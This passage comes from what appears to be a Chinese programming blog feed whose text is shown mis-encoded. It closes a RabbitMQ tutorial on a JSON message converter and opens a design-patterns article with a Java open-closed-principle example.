msg);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœæ­¢consumeræœåŠ¡</p><p>å‘é€æ¶ˆæ¯åæŸ¥çœ‹æ§åˆ¶å°ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457962.png" alt="image-20210422232835363" /></p><h3 id="1272é…ç½®jsonè½¬æ¢å™¨"><a class="markdownIt-Anchor" href="#1272é…ç½®jsonè½¬æ¢å™¨"></a> 12.7.2.é…ç½®JSONè½¬æ¢å™¨</h3><p>æ˜¾ç„¶ï¼ŒJDKåºåˆ—åŒ–æ–¹å¼å¹¶ä¸åˆé€‚ã€‚æˆ‘ä»¬å¸Œæœ›æ¶ˆæ¯ä½“çš„ä½“ç§¯æ›´å°ã€å¯è¯»æ€§æ›´é«˜ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨JSONæ–¹å¼æ¥åšåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><p>åœ¨publisherå’Œconsumerä¸¤ä¸ªæœåŠ¡ä¸­éƒ½å¼•å…¥ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.dataformat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-dataformat-xml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>é…ç½®æ¶ˆæ¯è½¬æ¢å™¨ã€‚</p><p>åœ¨å¯åŠ¨ç±»ä¸­æ·»åŠ ä¸€ä¸ªBeanå³å¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> MessageConverter <span class="hljs-title function_">jsonMessageConverter</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2JsonMessageConverter</span>();<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>å‚è€ƒèµ„æ–™</p><ol><li><a href="https://blog.csdn.net/lyyrhf/article/details/120159288">RabbitMQï¼å¥³æœ‹å‹çœ‹äº†éƒ½ä¼šçš„è¶…è¯¦ç»†ä¿å§†çº§é™„æºç ç¬”è®°ï¼çœ‹å®Œè¿˜ä¸ä¼šè¯·ç æˆ‘ï¼</a> (ä¸»è¦ï¼Œåšä¸»äººå¾ˆå¥½)</li><li><a href="https://pan.baidu.com/s/1HYQOom4lGmNsqBC9Ey5EJQ?pwd=yyds">å°šç¡…è°·RabbitMQæ•™ç¨‹èµ„æ–™</a></li><li><a href="https://pan.baidu.com/s/19uMSxEE4zDIBAjPU-EUH_w?pwd=yyds">é»‘é©¬SpringCloudçš„RabbitMQéƒ¨åˆ†èµ„æ–™ </a> ï¼ˆSpringAMQéƒ¨åˆ†ï¼‰</li></ol></li><li><p>å­¦ä¹ è§†é¢‘</p><ol><li><a href="https://www.bilibili.com/video/BV1cb4y1o7zz?p=1&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">å°šç¡…è°·RabbitMQæ•™ç¨‹ä¸¨å¿«é€ŸæŒæ¡MQæ¶ˆæ¯ä¸­é—´ä»¶</a></li><li><a href="https://www.bilibili.com/video/BV1LQ4y127n4?p=61&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">SpringCloud+RabbitMQ+Docker+Redis+æœç´¢+åˆ†å¸ƒå¼~~~</a> ï¼ˆSpringAMQéƒ¨åˆ†ï¼‰</li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>MQ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MQ</tag>
      
      <tag>Rabbitmq</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®¾è®¡æ¨¡å¼</title>
    <link href="/2023/01/05/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/2023/01/05/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æ ‡é¢˜é«˜äº®æ˜¯å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ï¼Œåœ¨å„å¤§å¼€æºæ¡†æ¶ä¸­ç”¨å¾—éƒ½æœ‰å¾ˆå¤šã€‚</p></blockquote><h1 id="è®¾è®¡æ¨¡å¼"><a class="markdownIt-Anchor" href="#è®¾è®¡æ¨¡å¼"></a> è®¾è®¡æ¨¡å¼</h1><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dp.png" alt="" /></p><p>è®¾è®¡æ¨¡å¼ï¼ˆDesignpatternï¼‰ä»£è¡¨äº†æœ€ä½³çš„å®è·µï¼Œé€šå¸¸è¢«æœ‰ç»éªŒçš„é¢å‘å¯¹è±¡çš„è½¯ä»¶å¼€å‘äººå‘˜æ‰€é‡‡ç”¨ã€‚è®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å¼€å‘äººå‘˜åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­é¢ä¸´çš„ä¸€èˆ¬é—®é¢˜çš„è§£å†³æ–¹æ¡ˆã€‚è¿™äº›è§£å†³æ–¹æ¡ˆæ˜¯ä¼—å¤šè½¯ä»¶å¼€å‘äººå‘˜ç»è¿‡ç›¸å½“é•¿çš„ä¸€æ®µæ—¶é—´çš„è¯•éªŒå’Œé”™è¯¯æ€»ç»“å‡ºæ¥çš„ã€‚</p><table><thead><tr><th>åˆ›å»ºå‹</th><th>åˆ›å»ºå‹</th><th>ç»“æ„å‹</th><th>ç»“æ„å‹</th><th>è¡Œä¸ºå‹</th><th>è¡Œä¸ºå‹</th></tr></thead><tbody><tr><td>å¸¸ç”¨</td><td>ä¸å¸¸ç”¨</td><td>å¸¸ç”¨</td><td>ä¸å¸¸ç”¨</td><td>å¸¸ç”¨</td><td>ä¸å¸¸ç”¨</td></tr><tr><td>å•ä¾‹ï¼ˆSingleton ï¼‰å·¥å‚ï¼ˆFactoryï¼‰æŠ½è±¡å·¥å‚ï¼ˆAbstract Factoryï¼‰å»ºé€ è€…ï¼ˆBuilderï¼‰</td><td>åŸå‹ï¼ˆPrototype ï¼‰</td><td>ä»£ç†ï¼ˆProxy ï¼‰æ¡¥æ¥ï¼ˆBridgeï¼‰è£…é¥°è€…ï¼ˆDecorator ï¼‰é€‚é…å™¨ï¼ˆAdapterï¼‰</td><td>å¤–è§‚ï¼ˆFacade ï¼‰ç»„åˆï¼ˆComposite ï¼‰äº«å…ƒï¼ˆFlyweightï¼‰</td><td>è§‚å¯Ÿè€… ï¼ˆObserver ï¼‰æ¨¡æ¿ï¼ˆTemplate ï¼‰ç­–ç•¥ï¼ˆStrategy ï¼‰èŒè´£é“¾ï¼ˆChain of Responsibilityï¼‰è¿­ä»£å™¨ï¼ˆIterator ï¼‰çŠ¶æ€ï¼ˆStateï¼‰</td><td>è®¿é—®è€…ï¼ˆVisitor ï¼‰å¤‡å¿˜å½•ï¼ˆMemento ï¼‰å‘½ä»¤ï¼ˆCommand ï¼‰è§£é‡Šå™¨ï¼ˆInterpreter ï¼‰ä¸­ä»‹ï¼ˆMediator ï¼‰</td></tr></tbody></table><h1 id="è®¾è®¡æ¨¡å¼ç®€ä»‹"><a class="markdownIt-Anchor" href="#è®¾è®¡æ¨¡å¼ç®€ä»‹"></a> è®¾è®¡æ¨¡å¼ç®€ä»‹</h1><p>è®¾è®¡æ¨¡å¼ï¼ˆDesignpatternï¼‰ä»£è¡¨äº†æœ€ä½³çš„å®è·µï¼Œé€šå¸¸è¢«æœ‰ç»éªŒçš„é¢å‘å¯¹è±¡çš„è½¯ä»¶å¼€å‘äººå‘˜æ‰€é‡‡ç”¨ã€‚è®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å¼€å‘äººå‘˜åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­é¢ä¸´çš„ä¸€èˆ¬é—®é¢˜çš„è§£å†³æ–¹æ¡ˆã€‚è¿™äº›è§£å†³æ–¹æ¡ˆæ˜¯ä¼—å¤šè½¯ä»¶å¼€å‘äººå‘˜ç»è¿‡ç›¸å½“é•¿çš„ä¸€æ®µæ—¶é—´çš„è¯•éªŒå’Œé”™è¯¯æ€»ç»“å‡ºæ¥çš„ã€‚</p><p>è®¾è®¡æ¨¡å¼æ˜¯ä¸€å¥—è¢«åå¤ä½¿ç”¨çš„ã€å¤šæ•°äººçŸ¥æ™“çš„ã€ç»è¿‡åˆ†ç±»ç¼–ç›®çš„ã€ä»£ç è®¾è®¡ç»éªŒçš„æ€»ç»“ã€‚ä½¿ç”¨è®¾è®¡æ¨¡å¼æ˜¯ä¸ºäº†é‡ç”¨ä»£ç ã€è®©ä»£ç æ›´å®¹æ˜“è¢«ä»–äººç†è§£ã€ä¿è¯ä»£ç å¯é æ€§ã€‚<br />æ¯«æ— ç–‘é—®ï¼Œè®¾è®¡æ¨¡å¼äºå·±äºä»–äººäºç³»ç»Ÿéƒ½æ˜¯å¤šèµ¢çš„ï¼Œè®¾è®¡æ¨¡å¼ä½¿ä»£ç ç¼–åˆ¶çœŸæ­£å·¥ç¨‹åŒ–ï¼Œè®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å·¥ç¨‹çš„åŸºçŸ³ï¼Œå¦‚åŒå¤§å¦çš„ä¸€å—å—ç –çŸ³ä¸€æ ·ã€‚é¡¹ç›®ä¸­åˆç†åœ°è¿ç”¨è®¾è®¡æ¨¡å¼å¯ä»¥å®Œç¾åœ°è§£å†³å¾ˆå¤šé—®é¢˜ï¼Œæ¯ç§æ¨¡å¼åœ¨ç°å®ä¸­éƒ½æœ‰ç›¸åº”çš„åŸç†æ¥ä¸ä¹‹å¯¹åº”ï¼Œæ¯ç§æ¨¡å¼éƒ½æè¿°äº†ä¸€ä¸ªåœ¨æˆ‘ä»¬å‘¨å›´ä¸æ–­é‡å¤å‘ç”Ÿçš„é—®é¢˜ï¼Œä»¥åŠè¯¥é—®é¢˜çš„æ ¸å¿ƒè§£å†³æ–¹æ¡ˆï¼Œè¿™ä¹Ÿæ˜¯è®¾è®¡æ¨¡å¼èƒ½è¢«å¹¿æ³›åº”ç”¨çš„åŸå› ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯-gofå››äººå¸®å…¨æ‹¼-gang-of-four"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯-gofå››äººå¸®å…¨æ‹¼-gang-of-four"></a> ä»€ä¹ˆæ˜¯ GOFï¼ˆå››äººå¸®ï¼Œå…¨æ‹¼ Gang of Fourï¼‰ï¼Ÿ</h2><p>åœ¨ 1994 å¹´ï¼Œç”± Erich Gammaã€Richard Helmã€Ralph Johnson å’Œ John Vlissides å››äººåˆè‘—å‡ºç‰ˆäº†ä¸€æœ¬åä¸º<strong>Design Patterns - Elements of Reusable Object-Oriented Softwareï¼ˆä¸­æ–‡è¯‘åï¼šè®¾è®¡æ¨¡å¼ -å¯å¤ç”¨çš„é¢å‘å¯¹è±¡è½¯ä»¶å…ƒç´ ï¼‰</strong> çš„ä¹¦ï¼Œè¯¥ä¹¦é¦–æ¬¡æåˆ°äº†è½¯ä»¶å¼€å‘ä¸­è®¾è®¡æ¨¡å¼çš„æ¦‚å¿µã€‚</p><p>å››ä½ä½œè€…åˆç§° <strong>GOFï¼ˆå››äººå¸®ï¼Œå…¨æ‹¼ Gang of Fourï¼‰</strong> ã€‚ä»–ä»¬æ‰€æå‡ºçš„è®¾è®¡æ¨¡å¼ä¸»è¦æ˜¯åŸºäºä»¥ä¸‹çš„é¢å‘å¯¹è±¡è®¾è®¡åŸåˆ™ã€‚</p><ul><li>å¯¹æ¥å£ç¼–ç¨‹è€Œä¸æ˜¯å¯¹å®ç°ç¼–ç¨‹ã€‚</li><li>ä¼˜å…ˆä½¿ç”¨å¯¹è±¡ç»„åˆè€Œä¸æ˜¯ç»§æ‰¿ã€‚</li></ul><h2 id="è®¾è®¡æ¨¡å¼çš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#è®¾è®¡æ¨¡å¼çš„ä½¿ç”¨"></a> è®¾è®¡æ¨¡å¼çš„ä½¿ç”¨</h2><p>è®¾è®¡æ¨¡å¼åœ¨è½¯ä»¶å¼€å‘ä¸­çš„ä¸¤ä¸ªä¸»è¦ç”¨é€”ã€‚</p><h3 id="å¼€å‘äººå‘˜çš„å…±åŒå¹³å°"><a class="markdownIt-Anchor" href="#å¼€å‘äººå‘˜çš„å…±åŒå¹³å°"></a> å¼€å‘äººå‘˜çš„å…±åŒå¹³å°</h3><p>è®¾è®¡æ¨¡å¼æä¾›äº†ä¸€ä¸ªæ ‡å‡†çš„æœ¯è¯­ç³»ç»Ÿï¼Œä¸”å…·ä½“åˆ°ç‰¹å®šçš„æƒ…æ™¯ã€‚ä¾‹å¦‚ï¼Œå•ä¾‹è®¾è®¡æ¨¡å¼æ„å‘³ç€ä½¿ç”¨å•ä¸ªå¯¹è±¡ï¼Œè¿™æ ·æ‰€æœ‰ç†Ÿæ‚‰å•ä¾‹è®¾è®¡æ¨¡å¼çš„å¼€å‘äººå‘˜éƒ½èƒ½ä½¿ç”¨å•ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å‘Šè¯‰å¯¹æ–¹ï¼Œç¨‹åºä½¿ç”¨çš„æ˜¯å•ä¾‹æ¨¡å¼ã€‚</p><h3 id="æœ€ä½³çš„å®è·µ"><a class="markdownIt-Anchor" href="#æœ€ä½³çš„å®è·µ"></a> æœ€ä½³çš„å®è·µ</h3><p>è®¾è®¡æ¨¡å¼å·²ç»ç»å†äº†å¾ˆé•¿ä¸€æ®µæ—¶é—´çš„å‘å±•ï¼Œå®ƒä»¬æä¾›äº†è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­é¢ä¸´çš„ä¸€èˆ¬é—®é¢˜çš„æœ€ä½³è§£å†³æ–¹æ¡ˆã€‚å­¦ä¹ è¿™äº›æ¨¡å¼æœ‰åŠ©äºç»éªŒä¸è¶³çš„å¼€å‘äººå‘˜é€šè¿‡ä¸€ç§ç®€å•å¿«æ·çš„æ–¹å¼æ¥å­¦ä¹ è½¯ä»¶è®¾è®¡ã€‚</p><h2 id="è®¾è®¡æ¨¡å¼çš„ç±»å‹"><a class="markdownIt-Anchor" href="#è®¾è®¡æ¨¡å¼çš„ç±»å‹"></a> è®¾è®¡æ¨¡å¼çš„ç±»å‹</h2><p>æ ¹æ®è®¾è®¡æ¨¡å¼çš„å‚è€ƒä¹¦ <strong>Design Patterns - Elements of Reusable Object-Oriented<br />Softwareï¼ˆä¸­æ–‡è¯‘åï¼šè®¾è®¡æ¨¡å¼ - å¯å¤ç”¨çš„é¢å‘å¯¹è±¡è½¯ä»¶å…ƒç´ ï¼‰</strong> ä¸­æ‰€æåˆ°çš„ï¼Œæ€»å…±æœ‰ 23ç§è®¾è®¡æ¨¡å¼ã€‚è¿™äº›æ¨¡å¼å¯ä»¥åˆ†ä¸ºä¸‰å¤§ç±»ï¼šåˆ›å»ºå‹æ¨¡å¼ï¼ˆCreational Patternsï¼‰ã€ç»“æ„å‹æ¨¡å¼ï¼ˆStructuralPatternsï¼‰ã€è¡Œä¸ºå‹æ¨¡å¼ï¼ˆBehavioral Patternsï¼‰ã€‚</p><p>1   <strong>åˆ›å»ºå‹æ¨¡å¼</strong></p><p>è¿™äº›è®¾è®¡æ¨¡å¼æä¾›äº†ä¸€ç§åœ¨åˆ›å»ºå¯¹è±¡çš„åŒæ—¶éšè—åˆ›å»ºé€»è¾‘çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ newè¿ç®—ç¬¦ç›´æ¥å®ä¾‹åŒ–å¯¹è±¡ã€‚è¿™ä½¿å¾—ç¨‹åºåœ¨åˆ¤æ–­é’ˆå¯¹æŸä¸ªç»™å®šå®ä¾‹éœ€è¦åˆ›å»ºå“ªäº›å¯¹è±¡æ—¶æ›´åŠ çµæ´»ã€‚</p><ul><li>å·¥å‚æ¨¡å¼ï¼ˆFactory Patternï¼‰</li><li>æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆAbstract Factory Patternï¼‰</li><li>å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰</li><li>å»ºé€ è€…æ¨¡å¼ï¼ˆBuilder Patternï¼‰</li><li>åŸå‹æ¨¡å¼ï¼ˆPrototype Patternï¼‰</li></ul><p>2 <strong>ç»“æ„å‹æ¨¡å¼</strong><br />è¿™äº›è®¾è®¡æ¨¡å¼å…³æ³¨ç±»å’Œå¯¹è±¡çš„ç»„åˆã€‚ç»§æ‰¿çš„æ¦‚å¿µè¢«ç”¨æ¥ç»„åˆæ¥å£å’Œå®šä¹‰ç»„åˆå¯¹è±¡è·å¾—æ–°åŠŸèƒ½çš„æ–¹å¼ã€‚</p><ul><li>é€‚é…å™¨æ¨¡å¼ï¼ˆAdapter Patternï¼‰</li><li>æ¡¥æ¥æ¨¡å¼ï¼ˆBridge Patternï¼‰</li><li>è¿‡æ»¤å™¨æ¨¡å¼ï¼ˆFilterã€Criteria Patternï¼‰</li><li>ç»„åˆæ¨¡å¼ï¼ˆComposite Patternï¼‰</li><li>è£…é¥°å™¨æ¨¡å¼ï¼ˆDecorator Patternï¼‰</li><li>å¤–è§‚æ¨¡å¼ï¼ˆFacade Patternï¼‰</li><li>äº«å…ƒæ¨¡å¼ï¼ˆFlyweight Patternï¼‰</li><li>ä»£ç†æ¨¡å¼ï¼ˆProxy Patternï¼‰</li></ul><p>3 <strong>è¡Œä¸ºå‹æ¨¡å¼</strong><br />è¿™äº›è®¾è®¡æ¨¡å¼ç‰¹åˆ«å…³æ³¨å¯¹è±¡ä¹‹é—´çš„é€šä¿¡ã€‚</p><ul><li>è´£ä»»é“¾æ¨¡å¼ï¼ˆChain of Responsibility Patternï¼‰</li><li>å‘½ä»¤æ¨¡å¼ï¼ˆCommand Patternï¼‰</li><li>è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter Patternï¼‰</li><li>è¿­ä»£å™¨æ¨¡å¼ï¼ˆIterator Patternï¼‰</li><li>ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator Patternï¼‰</li><li>å¤‡å¿˜å½•æ¨¡å¼ï¼ˆMemento Patternï¼‰</li><li>è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver Patternï¼‰</li><li>çŠ¶æ€æ¨¡å¼ï¼ˆState Patternï¼‰</li><li>ç©ºå¯¹è±¡æ¨¡å¼ï¼ˆNull Object Patternï¼‰</li><li>ç­–ç•¥æ¨¡å¼ï¼ˆStrategy Patternï¼‰</li><li>æ¨¡æ¿æ¨¡å¼ï¼ˆTemplate Patternï¼‰</li><li>è®¿é—®è€…æ¨¡å¼ï¼ˆVisitor Patternï¼‰</li></ul><p>4  <strong>J2EE æ¨¡å¼</strong><br />è¿™äº›è®¾è®¡æ¨¡å¼ç‰¹åˆ«å…³æ³¨è¡¨ç¤ºå±‚ã€‚è¿™äº›æ¨¡å¼æ˜¯ç”± Sun Java Center é‰´å®šçš„ã€‚</p><ul><li>MVC æ¨¡å¼ï¼ˆMVC Patternï¼‰</li><li>ä¸šåŠ¡ä»£è¡¨æ¨¡å¼ï¼ˆBusiness Delegate Patternï¼‰</li><li>ç»„åˆå®ä½“æ¨¡å¼ï¼ˆComposite Entity Patternï¼‰</li><li>æ•°æ®è®¿é—®å¯¹è±¡æ¨¡å¼ï¼ˆData Access Object Patternï¼‰</li><li>å‰ç«¯æ§åˆ¶å™¨æ¨¡å¼ï¼ˆFront Controller Patternï¼‰</li><li>æ‹¦æˆªè¿‡æ»¤å™¨æ¨¡å¼ï¼ˆIntercepting Filter Patternï¼‰</li><li>æœåŠ¡å®šä½å™¨æ¨¡å¼ï¼ˆService Locator Patternï¼‰</li><li>ä¼ è¾“å¯¹è±¡æ¨¡å¼ï¼ˆTransfer Object Patternï¼‰</li></ul><p>ä¸‹é¢ç”¨ä¸€ä¸ªå›¾ç‰‡æ¥æ•´ä½“æè¿°ä¸€ä¸‹è®¾è®¡æ¨¡å¼ä¹‹é—´çš„å…³ç³»ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/the-relationship-between-design-patterns.jpg" alt="è®¾è®¡æ¨¡å¼ä¹‹é—´çš„å…³ç³»" />(/</p><h1 id="è®¾è®¡æ¨¡å¼çš„å…­å¤§åŸåˆ™"><a class="markdownIt-Anchor" href="#è®¾è®¡æ¨¡å¼çš„å…­å¤§åŸåˆ™"></a> è®¾è®¡æ¨¡å¼çš„å…­å¤§åŸåˆ™</h1><h2 id="1-å¼€é—­åŸåˆ™open-close-principle"><a class="markdownIt-Anchor" href="#1-å¼€é—­åŸåˆ™open-close-principle"></a> <strong>1ã€å¼€é—­åŸåˆ™ï¼ˆOpen Close Principleï¼‰</strong></h2><p>å¼€é—­åŸåˆ™çš„æ„æ€æ˜¯ï¼š <strong>å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­</strong>ã€‚åœ¨ç¨‹åºéœ€è¦è¿›è¡Œæ‹“å±•çš„æ—¶å€™ï¼Œä¸èƒ½å»ä¿®æ”¹åŸæœ‰çš„ä»£ç ï¼Œå®ç°ä¸€ä¸ªçƒ­æ’æ‹”çš„æ•ˆæœã€‚ç®€è¨€ä¹‹ï¼Œæ˜¯ä¸ºäº†ä½¿ç¨‹åºçš„æ‰©å±•æ€§å¥½ï¼Œæ˜“äºç»´æŠ¤å’Œå‡çº§ã€‚æƒ³è¦è¾¾åˆ°è¿™æ ·çš„æ•ˆæœï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ¥å£å’ŒæŠ½è±¡ç±»ï¼Œåé¢çš„å…·ä½“è®¾è®¡ä¸­æˆ‘ä»¬ä¼šæåˆ°è¿™ç‚¹ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108204034839.png" alt="image-20230108204034839" /></p><p><code>Ocp.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.ocp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ocp</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//ä½¿ç”¨çœ‹çœ‹å­˜åœ¨çš„é—®é¢˜</span><br>      <span class="hljs-type">GraphicEditor</span> <span class="hljs-variable">graphicEditor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GraphicEditor</span>();<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Triangle</span>());<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//è¿™æ˜¯ä¸€ä¸ªç”¨äºç»˜å›¾çš„ç±» [ä½¿ç”¨æ–¹]</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GraphicEditor</span> &#123;<br>   <span class="hljs-comment">//æ¥æ”¶Shapeå¯¹è±¡ï¼Œç„¶åæ ¹æ®typeï¼Œæ¥ç»˜åˆ¶ä¸åŒçš„å›¾å½¢</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawShape</span><span class="hljs-params">(Shape s)</span> &#123;<br>      <span class="hljs-keyword">if</span> (s.m_type == <span class="hljs-number">1</span>)<br>         drawRectangle(s);<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s.m_type == <span class="hljs-number">2</span>)<br>         drawCircle(s);<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s.m_type == <span class="hljs-number">3</span>)<br>         drawTriangle(s);<br>   &#125;<br><br>   <span class="hljs-comment">//ç»˜åˆ¶çŸ©å½¢</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawRectangle</span><span class="hljs-params">(Shape r)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; ç»˜åˆ¶çŸ©å½¢ &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">//ç»˜åˆ¶åœ†å½¢</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawCircle</span><span class="hljs-params">(Shape r)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; ç»˜åˆ¶åœ†å½¢ &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//ç»˜åˆ¶ä¸‰è§’å½¢</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawTriangle</span><span class="hljs-params">(Shape r)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; ç»˜åˆ¶ä¸‰è§’å½¢ &quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//Shapeç±»ï¼ŒåŸºç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> &#123;<br>   <span class="hljs-type">int</span> m_type;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Rectangle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">1</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Circle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">2</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//æ–°å¢ç”»ä¸‰è§’å½¢</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Triangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Triangle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">3</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ–¹å¼ 1 çš„ä¼˜ç¼ºç‚¹</p></blockquote><ol><li><p>ä¼˜ç‚¹æ˜¯æ¯”è¾ƒå¥½ç†è§£ï¼Œç®€å•æ˜“æ“ä½œã€‚</p></li><li><p>ç¼ºç‚¹æ˜¯è¿åäº†è®¾è®¡æ¨¡å¼çš„ ocp åŸåˆ™ï¼Œå³å¯¹æ‰©å±•å¼€æ”¾(á¨€ ä¾›æ–¹)ï¼Œå¯¹ä¿®æ”¹å…³é—­(ä½¿ç”¨æ–¹)ã€‚å³å½“æˆ‘ä»¬ç»™ç±»å¢åŠ æ–°åŠŸèƒ½çš„æ—¶å€™ï¼Œå°½é‡ä¸ä¿®æ”¹ä»£ç ï¼Œæˆ–è€…å°½å¯èƒ½å°‘ä¿®æ”¹ä»£ç .</p></li><li><p>æ¯”å¦‚æˆ‘ä»¬è¿™æ—¶è¦æ–°å¢åŠ ä¸€ä¸ªå›¾å½¢ç§ç±» 